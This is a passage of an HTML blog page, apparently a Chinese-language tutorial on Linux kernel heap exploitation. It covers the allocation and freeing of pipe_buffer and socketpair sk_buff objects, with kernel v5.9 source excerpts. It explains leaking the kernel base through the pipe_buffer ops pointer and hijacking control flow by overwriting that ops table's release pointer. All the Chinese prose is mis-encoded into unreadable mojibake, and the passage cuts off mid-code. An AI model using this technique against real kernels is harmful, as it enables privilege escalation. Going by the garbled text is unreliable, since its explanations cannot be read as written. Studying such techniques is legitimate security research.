          <a href="#â‘¡é‡Šæ”¾-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-2" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>ç›´æ¥ä½¿ç”¨<code>close</code>å‡½æ•°é‡Šæ”¾ç®¡é“ç›¸å…³çš„æ–‡ä»¶æè¿°ç¬¦fdä¸¤ç«¯ã€‚</p>
<p>å‡½æ•°é“¾è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipe_release()-&gt;put_pipe_info()-&gt;free_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>éœ€è¦æ³¨æ„çš„æ—¶ï¼Œåœ¨<code>put_pipe_info</code>å‡½æ•°ä¸­</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">put_pipe_info</span><span class="params">(struct inode *inode, struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> kill = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;inode-&gt;i_lock);</span><br><span class="line">	<span class="keyword">if</span> (!--pipe-&gt;files) &#123;</span><br><span class="line">		inode-&gt;i_pipe = <span class="literal">NULL</span>;</span><br><span class="line">		kill = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;inode-&gt;i_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å½“filesä¸º0æ‰ä¼šè¿›å…¥è¯¥å‡½æ•°</span></span><br><span class="line">	<span class="keyword">if</span> (kill)</span><br><span class="line">		free_pipe_info(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>åªæœ‰<code>pipe_inode_info</code>è¿™ä¸ªç®¡ç†ç»“æ„ä¸­çš„<code>files</code>æˆå‘˜ä¸º0ï¼Œæ‰ä¼šè¿›è¡Œé‡Šæ”¾ï¼Œä¹Ÿå°±æ˜¯ç®¡é“ä¸¤ç«¯éƒ½å…³é—­æ‰æ‰è¡Œã€‚</p>
<p>ç›¸å…³é‡Šæ”¾å‡½æ•°<code>free_pipe_info</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_pipe_info</span><span class="params">(struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//å’Œç®¡é“ç›¸å…³çš„é‡Šæ”¾æœ‰å…³ï¼Œä¹Ÿæ˜¯ç›¸å…³çš„æ¼æ´ç‚¹</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line">		<span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">			pipe_buf_release(pipe, buf);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//é‡Šæ”¾pipe_bufferæ•°ç»„,kmalloc-1024</span></span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">    <span class="comment">//é‡Šæ”¾pipe_inode_infoç®¡ç†ç»“æ„,kmalloc-192</span></span><br><span class="line">	kfree(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="3-åˆ©ç”¨-1"   >
          <a href="#3-åˆ©ç”¨-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨-1" class="headerlink" title="(3)åˆ©ç”¨"></a>(3)åˆ©ç”¨</h3>
      
        <h4 id="â‘ ä¿¡æ¯æ³„éœ²"   >
          <a href="#â‘ ä¿¡æ¯æ³„éœ²" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ ä¿¡æ¯æ³„éœ²" class="headerlink" title="â‘ ä¿¡æ¯æ³„éœ²"></a>â‘ ä¿¡æ¯æ³„éœ²</h4>
      <p><code>pipe_buffer</code>ç»“æ„çš„<code>buf</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­çš„<code>ops</code>æˆå‘˜ï¼Œå³<code>struct pipe_buf_operations</code>ç»“æ„çš„<code>pipe-&gt;bufs[i]-&gt;ops</code>ï¼Œå…¶ä¸­ä¿å­˜ç€å…¨å±€çš„å‡½æ•°è¡¨ï¼Œå¯é€šè¿‡è¿™ä¸ªæ¥æ³„éœ²å†…æ ¸åŸºåœ°å€ï¼Œç›¸å…³ç»“æ„å¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡åŠ«æŒç¨‹åºæµ"   >
          <a href="#â‘¡åŠ«æŒç¨‹åºæµ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡åŠ«æŒç¨‹åºæµ" class="headerlink" title="â‘¡åŠ«æŒç¨‹åºæµ"></a>â‘¡åŠ«æŒç¨‹åºæµ</h4>
      <p>å½“å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œè°ƒç”¨åˆ°<code>free_pipe_info</code>å‡½æ•°ï¼Œåœ¨æ¸…ç†<code>pipe_buffer</code>æ—¶è¿›å…¥å¦‚ä¸‹åˆ¤æ–­ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">    pipe_buf_release(pipe, buf);</span><br></pre></td></tr></table></div></figure>

<p>å½“ç®¡é“ä¸­å­˜åœ¨æœªè¢«è¯»å–çš„æ•°æ®æ—¶ï¼Œå³æˆ‘ä»¬éœ€è¦è°ƒç”¨<code>write</code>å‘ç®¡é“çš„å†™å…¥ç«¯å†™å…¥æ•°æ®</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">    buf-&gt;page = page;</span><br><span class="line">    buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">    buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åä¸è¦å°†æ•°æ®å…¨éƒ¨è¯»å–å‡ºæ¥ï¼Œå¦‚æœå…¨éƒ¨è¯»å–å‡ºæ¥çš„è¯ï¼Œé‚£ä¹ˆåœ¨<code>read</code>å¯¹åº”çš„<code>pipe_read</code>å‡½æ•°ä¸­å°±ä¼šå¦‚ä¸‹æƒ…å†µ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_read</span><span class="params">(struct kiocb *iocb, struct iov_iter *to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (!buf-&gt;len) &#123;</span><br><span class="line">        pipe_buf_release(pipe, buf);</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä»è€Œè°ƒç”¨<code>pipe_buf_release</code>å°†<code>buf-&gt;ops</code>æ¸…ç©ºã€‚</p>
<p>ğŸ”ºæ³¨ï¼šï¼ˆå…¶å®è¿™é‡Œæ—¢ç„¶è°ƒç”¨åˆ°äº†<code>pipe_buf_release</code>å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥é€šè¿‡<code>read</code>å°†ç®¡é“<code>pipe</code>ä¸­çš„æ‰€æœ‰æ•°æ®è¯»å–å‡ºæ¥ï¼Œå…¶å®ä¹Ÿèƒ½æ‰§è¡Œè¯¥<code>release</code>å‡½æ•°æŒ‡é’ˆçš„ï¼Œä»è€ŒåŠ«æŒç¨‹åºæ§åˆ¶æµçš„ã€‚ï¼‰</p>
<p>é‚£ä¹ˆæ¥ç€ä¸Šè¿°çš„æƒ…å†µï¼Œé‚£ä¹ˆåœ¨å…³é—­ä¸¤ç«¯æ—¶<code>buf-&gt;ops</code>è¿™ä¸ªå‡½æ•°è¡¨å°±ä¼šå­˜åœ¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png" alt="image-20220509192251738"></p>
<p>è€Œå½“<code>buf-&gt;ops</code>è¿™ä¸ªå‡½æ•°è¡¨å­˜åœ¨æ—¶ï¼Œå…³é—­ç®¡é“ç¬¦ä¸¤ç«¯è¿›å…¥ä¸Šè¿°åˆ¤æ–­ä¹‹åï¼Œå°±ä¼šè°ƒç”¨åˆ°å…¶ä¸­çš„<code>pipe_buf_release</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨åˆ°è¿™ä¸ª<code>buf-&gt;ops</code>å‡½æ•°è¡¨ç»“æ„ä¸‹å¯¹åº”çš„<code>relase</code>å‡½æ•°æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆåœ¨ä¸Šè¿°çš„<code>pipe_buf_operations</code>ç»“æ„ä¸­æœ‰æåˆ°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png" alt="image-20220509193945468"></p>
<p>é‚£ä¹ˆå¦‚æœåŠ«æŒäº†<code>buf-&gt;ops</code>è¿™ä¸ªå‡½æ•°è¡¨ï¼Œå°±èƒ½æ§åˆ¶åˆ°<code>release</code>å‡½æ•°æŒ‡é’ˆï¼Œä»è€ŒåŠ«æŒæ§åˆ¶æµç¨‹ã€‚</p>
<p>ä¸è¿‡<code>pipe</code>ç®¡é“å…·ä½“çš„ä¿å­˜çš„æ•°æ®æ”¾åœ¨å“ªé‡Œï¼Œè¿˜æ˜¯ä¸å¤ªæ¸…æ¥šï¼Œå¬<code>bsauce</code>è¯´æ˜¯åœ¨<code>struct pipe_buffer</code>ç»“æ„ä¸‹<code>buf</code>çš„<code>page</code>é‡Œé¢ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°ï¼Œåç»­è¿˜éœ€è¦ç»§ç»­çœ‹çœ‹ï¼Œå…ˆmarkä¸€ä¸‹ã€‚è¿™æ ·ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œæ¯å†™å…¥ä¸€æ¡ä¿¡æ¯æ—¶ï¼Œå†…æ ¸çš„<code>kmalloc</code>å¯¹åº”çš„å †å†…å­˜åŸºæœ¬æ˜¯ä¸å‘ç”Ÿå˜åŒ–çš„ï¼Œä¸ä¸‹é¢æåˆ°çš„<code>sk_buff</code>æœ‰ç‚¹ä¸åŒã€‚</p>

        <h2 id="3-sk-buffâ€”kmalloc-512åŠä»¥ä¸Š"   >
          <a href="#3-sk-buffâ€”kmalloc-512åŠä»¥ä¸Š" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-sk-buffâ€”kmalloc-512åŠä»¥ä¸Š" class="headerlink" title="3.sk_buffâ€”kmalloc-512åŠä»¥ä¸Š"></a>3.sk_buffâ€”kmalloc-512åŠä»¥ä¸Š</h2>
      <p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40039738/article/details/81095013" >(31æ¡æ¶ˆæ¯) socketpairçš„ç”¨æ³•å’Œç†è§£_é›ªè¿‡æ— ç—•_çš„åšå®¢-CSDNåšå®¢_socketpair</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>å’Œè¯¥ç»“æ„ä½“ç›¸å…³çš„æ˜¯ä¸€ä¸ª<code>socketpair</code>ç³»ç»Ÿè°ƒç”¨è¿™ä¸ªä¹Ÿç®—æ˜¯<code>socket</code>ç½‘ç»œåè®®çš„ä¸€ç§ï¼Œä½†æ˜¯æ˜¯åœ¨æœ¬åœ°è¿›ç¨‹ä¹‹é—´é€šä¿¡çš„ï¼Œè€Œéåœ¨ç½‘ç»œä¹‹é—´çš„é€šä¿¡ã€‚è¯´åˆ°åº•ï¼Œè¿™ä¸ªå…¶å®å’Œ<code>pipe</code>éå¸¸åƒï¼Œä¹Ÿæ˜¯ä¸€ä¸ªè¿›ç¨‹é—´çš„é€šä¿¡æ‰‹æ®µã€‚ä¸è¿‡ç›¸å…³åŒºåˆ†å¦‚ä¸‹ï¼š</p>
<ul>
<li>æ•°æ®ä¼ è¾“æ¨¡å¼<ul>
<li><code>pipe</code>ï¼šå•å·¥ï¼Œå‘é€ç«¯<code>fd[1]</code>å‘é€æ•°æ®ï¼Œæ¥æ”¶ç«¯<code>fd[0]</code>æ¥æ”¶æ•°æ®</li>
<li><code>socketpair</code>ï¼šå…¨åŒå·¥ï¼ŒåŒä¸€æ—¶åˆ»ä¸¤ç«¯å‡å¯å‘é€å’Œæ¥æ”¶æ•°æ®ï¼Œæ— è®ºä¿¡é“ä¸­çš„æ•°æ®æ˜¯å¦è¢«æ¥æ”¶å®Œæ¯•ã€‚</li>
</ul>
</li>
<li>æ¨¡å¼<ul>
<li><code>pipe</code>ï¼šç”±<code>flag</code>æ¥å®šä¹‰ä¸åŒæ¨¡å¼</li>
<li><code>socketpair</code>ï¼šé»˜è®¤é˜»å¡çŠ¶æ€</li>
</ul>
</li>
</ul>
<p>æ­¤å¤–åœ¨ã€ŠLinuxç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹ä¸€ä¹¦ä¸­æåˆ°ï¼Œ<code>pipe()</code>å‡½æ•°å®é™…ä¸Šè¢«å®ç°æˆäº†ä¸€ä¸ªå¯¹<code>socketpair</code>çš„è°ƒç”¨ã€‚</p>

        <h3 id="1-ä½¿ç”¨æ–¹æ³•-2"   >
          <a href="#1-ä½¿ç”¨æ–¹æ³•-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä½¿ç”¨æ–¹æ³•-2" class="headerlink" title="(1)ä½¿ç”¨æ–¹æ³•"></a>(1)ä½¿ç”¨æ–¹æ³•</h3>
      
        <h4 id="â‘ åˆ›å»º-3"   >
          <a href="#â‘ åˆ›å»º-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º-3" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//é»˜è®¤å¿…é¡»</span></span><br><span class="line"><span class="keyword">int</span> socket_fd[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//domainå‚æ•°å¿…é¡»è¢«æŒ‡å®šä¸ºAF_UNIX,ä¸åŒçš„</span></span><br><span class="line"><span class="keyword">int</span> sockPair_return = socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socket_fd);</span><br><span class="line"><span class="keyword">if</span>( sockPair_return &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    perror( <span class="string">&quot;socketpair()&quot;</span> );</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åå’Œ<code>pipe</code>ç®¡é“ä¸€æ ·ï¼Œä½¿ç”¨<code>write/read</code>å³å¯ï¼Œä¸è¿‡è¿™ä¸ªçš„fdä¸¤ç«¯éƒ½å¯ä»¥å†™å…¥è¯»å–ï¼Œä½†æ˜¯æ¶ˆæ¯ä¼ é€’çš„æ—¶å€™ä¸€ç«¯å†™å…¥æ¶ˆæ¯ï¼Œå°±éœ€è¦ä»å¦ä¸€ç«¯æ‰èƒ½æŠŠæ¶ˆæ¯è¯»å–å‡ºæ¥</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(socket_fd[<span class="number">0</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(socket_fd[<span class="number">1</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡é‡Šæ”¾-3"   >
          <a href="#â‘¡é‡Šæ”¾-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-3" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(socket_fd[<span class="number">0</span>]);</span><br><span class="line">close(socket_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°å’Œ<code>pipe</code>æ˜¯å¾ˆç›¸ä¼¼çš„ã€‚</p>

        <h3 id="2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-2"   >
          <a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-2" class="headerlink" title="(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾"></a>(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</h3>
      <p>åœ¨è°ƒç”¨<code>socketpair</code>è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å·æ—¶ï¼Œå¹¶ä¸ä¼šè¿›è¡Œç›¸å…³çš„å†…å­˜åˆ†é…ï¼Œåªæœ‰åœ¨ä½¿ç”¨<code>write</code>æ¥å†™å…¥æ¶ˆæ¯ï¼Œè¿›è¡Œæ•°æ®ä¼ è¾“æ—¶æ‰ä¼šåˆ†é…ã€‚</p>

        <h4 id="â‘ åˆ†é…-1"   >
          <a href="#â‘ åˆ†é…-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ†é…-1" class="headerlink" title="â‘ åˆ†é…"></a>â‘ åˆ†é…</h4>
      <p>åœ¨è°ƒç”¨<code>write</code>è¿›è¡Œæ•°æ®å†™å…¥æ—¶</p>
<p>å‡½æ•°é“¾ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write -&gt; ksys_write() -&gt; vfs_write() -&gt; new_sync_write() -&gt; call_write_iter() -&gt; sock_write_iter() -&gt; sock_sendmsg() -&gt; sock_sendmsg_nosec() -&gt; unix_stream_sendmsg()-&gt;å†…å­˜ç”³è¯·/æ•°æ®å¤åˆ¶</span><br></pre></td></tr></table></div></figure>

<p>åœ¨<code>unix_stream_sendmsg</code>å¼€å§‹åˆ†å‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">			       <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">other</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> err, size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	<span class="keyword">int</span> sent = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scm_cookie</span> <span class="title">scm</span>;</span></span><br><span class="line">	<span class="keyword">bool</span> fds_sent = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> data_len;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">	<span class="keyword">while</span> (sent &lt; len) &#123;</span><br><span class="line">		size = len - sent;</span><br><span class="line">		<span class="comment">/* Keep two messages in the pipe so it schedules better */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, (sk-&gt;sk_sndbuf &gt;&gt; <span class="number">1</span>) - <span class="number">64</span>);</span><br><span class="line">		<span class="comment">/* allow fallback to order-0 allocations */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, SKB_MAX_HEAD(<span class="number">0</span>) + UNIX_SKB_FRAGS_SZ);</span><br><span class="line">		data_len = <span class="keyword">max_t</span>(<span class="keyword">int</span>, <span class="number">0</span>, size - SKB_MAX_HEAD(<span class="number">0</span>));</span><br><span class="line">		data_len = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_ALIGN(data_len));</span><br><span class="line">        <span class="comment">//------------------åˆ†å‰ä¸€:å†…å­˜ç”³è¯·éƒ¨åˆ†</span></span><br><span class="line">		skb = sock_alloc_send_pskb(sk, size - data_len, data_len,</span><br><span class="line">					   msg-&gt;msg_flags &amp; MSG_DONTWAIT, &amp;err,</span><br><span class="line">					   get_order(UNIX_SKB_FRAGS_SZ));</span><br><span class="line">        <span class="comment">//ç›¸å…³æ£€æŸ¥éƒ¨åˆ†</span></span><br><span class="line">		<span class="keyword">if</span> (!skb)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		<span class="comment">/* Only send the fds in the first buffer */</span></span><br><span class="line">		err = unix_scm_to_skb(&amp;scm, skb, !fds_sent);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//.....</span></span><br><span class="line">        <span class="comment">//----------------------åˆ†å‰äºŒ:æ•°æ®å¤åˆ¶éƒ¨åˆ†</span></span><br><span class="line">		skb_put(skb, size - data_len);</span><br><span class="line">		skb-&gt;data_len = data_len;</span><br><span class="line">		skb-&gt;len = size;</span><br><span class="line">        <span class="comment">//è¿™é‡Œå¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶</span></span><br><span class="line">		err = skb_copy_datagram_from_iter(skb, <span class="number">0</span>, &amp;msg-&gt;msg_iter, size);</span><br><span class="line">		<span class="keyword">if</span> (err) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">		sent += size;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sent;</span><br><span class="line">out_err:</span><br><span 